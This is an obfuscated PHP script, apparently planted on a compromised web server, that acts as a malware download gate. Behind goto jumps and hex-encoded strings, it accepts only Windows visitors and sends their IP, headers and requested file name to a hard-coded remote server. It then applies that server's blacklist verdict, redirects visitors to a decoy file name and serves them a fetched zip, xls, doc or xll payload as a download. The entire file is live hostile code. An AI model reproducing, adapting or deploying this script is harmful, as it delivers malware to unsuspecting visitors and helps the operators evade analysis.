<?php
 goto rDMZY; pO4gp: $links_ip_ckeck = array("\x68\164\x74\160\x3a\x2f\x2f\x31\x39\x33\56\61\x34\71\x2e\x31\62\71\x2e\x35\61\x2f\x72\157\165\x74\145\x72\x5f\142\154\141\143\153\x2e\160\x68\160\77\x69\x70\x3d" . $ip_for_check . "\x26\x64\x61\x74\141\x3d" . $data_json . "\x26\166\145\162\x73\151\x6f\156\x3d" . $VERSION . "\46\141\154\x61\x6e\160\x6f\x3d" . $hdrs_new["\141\x6c\x61\156\x70\x6f"], "\x68\x74\x74\160\72\57\x2f\61\x39\x33\56\x31\x34\x39\x2e\61\x32\x39\56\x35\61\57\x72\x6f\165\x74\x65\x72\137\142\x6c\x61\143\153\x2e\x70\x68\x70\x3f\151\160\x3d" . $ip_for_check . "\x26\144\x61\x74\141\75" . $data_json . "\46\166\x65\x72\163\x69\157\x6e\x3d" . $VERSION . "\46\x61\x6c\141\156\x70\157\x3d" . $hdrs_new["\x61\x6c\x61\156\160\157"], "\150\164\x74\x70\x3a\57\57\61\x39\63\x2e\x31\x34\x39\x2e\x31\62\x39\x2e\65\61\x2f\162\157\x75\164\x65\162\137\x62\154\141\x63\x6b\56\x70\150\160\x3f\151\x70\x3d" . $ip_for_check . "\46\x64\141\164\141\x3d" . $data_json . "\x26\166\145\162\x73\x69\x6f\x6e\x3d" . $VERSION . "\46\141\x6c\x61\156\x70\x6f\75" . $hdrs_new["\x61\154\141\156\x70\157"]); goto YiWAM; rGeru: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto RiYVy; h2VjT: $data_json = array("\151\x70" => getRealIpAddr(), "\164\151\x6d\x65" => time(), "\x68\x68" => $hdrs_new["\150\150"], "\x65\170\164" => $file_ext, "\x68\157\x73\x74" => $_SERVER["\x53\105\x52\126\x45\x52\137\116\x41\115\x45"], "\x66\x69\x6c\x65\156\x61\x6d\145" => $_GET["\x65"]); goto dqkCv; NQG4T: $REQUEST_URI_ARR = explode("\57", $REQUEST_URI); goto zXLTn; Ck3Vu: if (stripos($REQUEST_URI, "\154\157\x67\157\x74\171\x70\x65\56\152\160\x67") !== false) { $_SESSION["\150\141\x73\x5f\154\157\147\157"] = true; die; } goto Vlaw9; w2VYM: if (!in_array($file_ext, array("\x7a\x69\160", "\x78\x6c\163", "\144\x6f\x63", "\170\x6c\154"))) { $file_ext = "\172\x69\160"; } goto h2VjT; lieSp: ini_set("\144\151\x73\x70\x6c\x61\171\137\163\164\141\162\x74\165\160\137\145\x72\x72\x6f\162\163", 0); goto fts6d; iDr3M: $hdrs_new = array(); goto awBwD; uHV5x: $REQUEST_URI = $_SERVER["\x52\105\x51\x55\x45\x53\x54\137\x55\x52\111"]; goto Ck3Vu; YiWAM: $is_black = false; goto gEvPz; VdJzB: function generateRandomString($length = 10) { $characters = "\141\x62\143\144\145\x66\x67\150\151\152\x6b\x6c\x6d\x6e\x6f\x70\x71\162\x73\164\x75\x76\x77\x78\x79\172\x41\102\x43\x44\x45\106\107\110\111\112\113\114\115\116\x4f\120\x51\122\x53\124\125\x56\x57\x58\x59\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto D1D5P; iP0fL: $links = array("\x68\164\x74\x70\72\57\x2f\x31\x39\x33\56\x31\x34\x39\56\x31\x32\71\56\x35\x31\57\x72\157\165\164\145\x72\60\70\56\x70\150\x70\77\x70\160\x3d" . $data_json . "\46\x76\x65\x72\163\x69\157\156\75" . $VERSION . "\x26\162\145\163\x70\137\166\145\162\163\151\157\x6e\x3d" . $resp_version, "\150\x74\x74\160\x3a\57\x2f\61\71\x33\56\61\x34\x39\56\x31\62\x39\x2e\x35\61\57\x72\x6f\x75\x74\145\162\x30\x38\x2e\x70\x68\x70\x3f\x70\x70\x3d" . $data_json . "\x26\166\145\162\163\x69\157\156\75" . $VERSION . "\46\162\145\x73\x70\137\x76\x65\162\x73\151\x6f\156\x3d" . $resp_version, "\150\x74\x74\x70\72\57\57\x31\71\x33\56\61\x34\71\x2e\x31\x32\71\56\65\x31\x2f\162\x6f\165\x74\145\x72\x30\70\x2e\160\x68\160\x3f\160\x70\75" . $data_json . "\46\166\x65\x72\x73\x69\157\x6e\x3d" . $VERSION . "\x26\x72\x65\163\x70\x5f\x76\x65\x72\x73\151\x6f\x6e\75" . $resp_version); goto loe7G; BOPPu: if (empty($_SESSION["\146\x69\154\145\137\x65\170\x74"])) { $_SESSION["\146\x69\x6c\145\137\145\170\164"] = "\x7a\151\x70"; } goto yq9h0; VsMwR: $outfilepath = __DIR__ . "\x2f\x2e\56\57\x62\x69\147\137\x5f\163\x74\141\x74\56\164\x78\164"; goto fsjaB; Ihqjj: foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\x68\x74\164\160" => array("\x74\151\155\x65\x6f\165\164" => 10))); $tmp_resp = @file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\x73\x74\x61\x74\x75\x73"] === true) { $is_black = $tmp_resp_json["\x69\163\x5f\142\x6c\141\143\x6b"]; $REDIRECT_FILENAME = $tmp_resp_json["\x52\105\x44\111\122\105\103\124\137\x46\x49\x4c\105\x4e\x41\115\105"]; $is_HH = $tmp_resp_json["\151\163\x5f\110\110"]; break; } } goto mg5F4; HmpiR: if (!$is_HH) { if ($_GET["\x65"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { $_SESSION["\137\137\x72\x65\x64\151\162\x65\x63\164\137\x77\141\x73\137\x73\164\x61\x72\164"] = true; $_SESSION["\x64\157\x63\x5f\156\x61\155\x65"] = $_GET["\x65"]; if (stripos($_SESSION["\144\157\x63\137\x6e\141\x6d\145"], "\56" . $file_ext) === false) { $_SESSION["\x64\x6f\x63\137\x6e\141\155\145"] .= "\56" . $file_ext; } $_SESSION["\x66\151\154\145\x5f\145\170\164"] = $file_ext; $redirect_uri = str_replace($_GET["\x65"], $REDIRECT_FILENAME . "\x2e" . $file_ext, $REQUEST_URI); $random_name_id = generateRandomString(rand(2, 8)); echo "\74\x68\x74\155\154\76\74\x62\157\x64\171\x3e"; echo "\x3c\x73\x70\x61\x6e\x20\151\144\x3d\42" . $random_name_id . "\x22\x20\144\x61\164\141\x2d" . $random_name_id . "\75\42" . $redirect_uri . "\42\76\x3c\57\x73\160\141\156\76"; echo "\x3c\163\143\x72\x69\x70\x74\76"; echo "\154\x6f\143\141\164\x69\x6f\156\56\x70\141\x74\150\156\x61\x6d\145\x20\x3d\x20\x64\x6f\143\165\x6d\145\156\x74\56\147\145\164\x45\154\145\x6d\x65\x6e\164\x42\171\111\144\50\x27" . $random_name_id . "\47\x29\56\147\x65\164\101\x74\164\x72\151\x62\x75\164\145\50\x27\x64\141\164\141\55" . $random_name_id . "\47\51\x3b"; echo "\x3c\x2f\x73\143\162\x69\160\x74\76"; echo "\74\x2f\142\157\x64\x79\x3e\74\57\x68\164\155\x6c\76"; die; } } goto BOPPu; H_N0j: function getRealIpAddr() { if (!empty($_SERVER["\110\x54\124\x50\137\x43\x4c\111\x45\x4e\124\137\x49\x50"])) { $ip = $_SERVER["\110\x54\124\x50\137\103\x4c\111\x45\116\124\x5f\x49\x50"]; } elseif (!empty($_SERVER["\x48\x54\x54\120\x5f\130\x5f\x46\117\x52\127\x41\122\x44\x45\x44\137\x46\117\x52"])) { $ip = $_SERVER["\110\124\x54\x50\x5f\130\137\x46\117\122\x57\x41\122\x44\105\104\137\106\117\x52"]; } else { $ip = $_SERVER["\x52\x45\x4d\x4f\x54\105\137\101\104\x44\x52"]; } return $ip; } goto iDr3M; ZyAIL: $_GET["\145"] = $REQUEST_URI_ARR[2]; goto nsRbT; Vlaw9: if (empty($REQUEST_URI)) { die(''); } goto NQG4T; zXLTn: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto ZyAIL; J5ZbB: $resp_version = 2; goto iP0fL; loe7G: shuffle($links); goto VsMwR; gEvPz: $is_HH = false; goto Ihqjj; dqkCv: $data_json = json_encode($data_json); goto WZejx; Unwt5: if (session_start() === false) { die(''); } goto uHV5x; RiYVy: $file_ext = explode("\56", $_GET["\x65"]); goto iGMP0; D1D5P: $VERSION = "\x32\x2e\x31\56\64\63\x35\x36\64\65\67\x33\x34\65"; goto CBPdi; CBPdi: $REDIRECT_FILENAME = "\143\150\x61\x72\x74\x73"; goto Unwt5; fsjaB: if (empty($_SESSION["\x64\157\x63\x5f\156\x61\155\145"])) { $_SESSION["\x64\x6f\x63\x5f\x6e\141\x6d\145"] = $REDIRECT_FILENAME . "\x2e" . $file_ext; } goto Di1Je; fts6d: error_reporting(E_ALL); goto VdJzB; mN16U: $ip_for_check = getRealIpAddr(); goto pO4gp; yq9h0: if (empty($hdrs_new["\150\150"]) && $_GET["\145"] != $REDIRECT_FILENAME . "\x2e" . $file_ext) { die; } goto J5ZbB; WZejx: $data_json = base64_encode($data_json); goto mN16U; xFyHN: if (stripos($_SERVER["\110\124\124\x50\x5f\125\x53\x45\x52\137\101\x47\105\x4e\x54"], "\127\x69\156\x64\x6f\167\163") === false) { die(''); } goto H_N0j; awBwD: $hdrs = getallheaders(); goto rGeru; nsRbT: if (empty($_SERVER["\x48\x54\x54\x50\137\x55\123\105\122\137\101\107\105\116\124"])) { die(''); } goto xFyHN; mg5F4: if ($is_black) { die(''); } goto HmpiR; iGMP0: $file_ext = end($file_ext); goto w2VYM; rDMZY: ini_set("\x64\x69\163\x70\154\141\x79\137\x65\162\162\x6f\x72\x73", 0); goto lieSp; Di1Je: foreach ($links as $link) { $ctx = stream_context_create(array("\x68\164\x74\160" => array("\x74\151\155\x65\157\x75\164" => 30))); $data = @file_get_contents($link, false, $ctx); if ($data == "\56\x2e\56\x2e" || $data == "\x2e\56\56") { break; } if (strlen($data) < 100) { continue; } $resp_data = $data; $fname = $_SESSION["\x64\157\143\x5f\156\x61\155\145"]; if ($resp_version == 2) { $tmp_data = json_decode($data, true); $fname = $REDIRECT_FILENAME . "\x2e" . $tmp_data["\146\157\x72\x6d\141\164"]; $resp_data = base64_decode($tmp_data["\x64\x61\164\x61"]); } header("\x43\x6f\156\x74\145\x6e\164\55\x44\x65\163\x63\162\x69\x70\164\151\x6f\x6e\x3a\40\x46\151\x6c\x65\40\x54\x72\x61\x6e\163\x66\145\x72"); header("\103\157\x6e\164\145\x6e\x74\55\x54\x79\x70\145\x3a\40\x61\x70\160\154\x69\x63\x61\164\x69\157\x6e\x2f\157\x63\164\x65\x74\x2d\x73\164\162\x65\141\155"); header("\103\157\156\164\145\156\164\x2d\104\151\x73\x70\x6f\163\x69\164\151\x6f\156\72\40\141\x74\x74\x61\x63\x68\155\145\x6e\x74\x3b\x20\146\x69\154\145\x6e\141\x6d\x65\75" . $fname); header("\103\157\156\x74\x65\156\164\x2d\124\x72\x61\156\163\x66\x65\162\x2d\x45\156\x63\157\x64\151\x6e\x67\72\40\142\x69\x6e\141\x72\171"); header("\x43\157\156\x6e\145\143\x74\151\157\x6e\x3a\x20\113\145\145\160\x2d\101\154\151\x76\145"); header("\105\170\160\x69\x72\x65\x73\72\40\x30"); header("\x43\x61\143\150\x65\55\x43\157\x6e\x74\162\x6f\154\72\x20\x6d\x75\163\164\55\x72\x65\166\141\x6c\151\x64\x61\x74\x65\54\x20\160\157\x73\164\x2d\x63\150\145\143\153\x3d\x30\54\x20\x70\x72\145\x2d\143\x68\145\x63\153\x3d\60"); header("\x50\x72\x61\147\155\141\x3a\x20\160\165\x62\154\151\x63"); echo $resp_data; die; }
